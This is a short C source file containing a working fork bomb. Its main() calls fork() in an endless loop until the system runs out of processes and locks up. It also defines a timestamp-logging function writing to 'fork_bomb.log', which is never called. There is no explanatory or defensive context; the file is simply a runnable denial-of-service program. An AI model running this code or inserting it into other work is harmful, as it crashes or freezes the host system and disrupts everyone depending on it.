#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>

void log_time() {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    long nanoseconds = ts.tv_sec * 1000000000L + ts.tv_nsec;
    FILE *f = fopen("fork_bomb.log", "a");
    fprintf(f, "%ld\n", nanoseconds);
    fclose(f);
}

int main() {
    while (1) {
        fork();
    }
    return 0;
}